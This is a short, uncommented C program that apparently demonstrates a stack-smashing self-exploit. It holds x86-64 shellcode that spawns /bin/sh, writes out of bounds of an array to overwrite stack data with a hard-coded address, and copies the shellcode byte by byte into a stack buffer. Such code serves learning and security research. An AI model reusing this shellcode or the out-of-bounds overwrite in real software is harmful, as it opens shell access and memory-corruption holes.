#include <stdio.h>
#include<string.h>
char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
void exploit(){
        int arr[1] = {5};
        arr[1] = 10;
        arr[3] = 0xfffee0d7;
        arr[2] = 0x00007fff;
        char carr[27];
        carr[0] = '\x31';
        carr[1] = '\xc0';
        carr[2] = '\x48';
        carr[3] = '\xbb';
        carr[4] = '\xd1';
        carr[5] = '\x9d';
        carr[6] = '\x96';
        carr[7] = '\x91';
        carr[8] = '\xd0';
        carr[9] = '\x8c';
        carr[10] = '\x97';
        carr[11] = '\xff';
        carr[12] = '\x48';
        carr[13] = '\xf7';
        carr[14] = '\xdb';
        carr[15] = '\x53';
        carr[16] = '\x54';
        carr[17] = '\x5f';
        carr[18] = '\x99';
        carr[19] = '\x52';
        carr[20] = '\x57';
        carr[21] = '\x54';
        carr[22] = '\x5e';
        carr[23] = '\xb0';
        carr[24] = '\x3b';
        carr[25] = '\x0f';
        carr[26] = '\x05';
}

int main()
{
        exploit();
}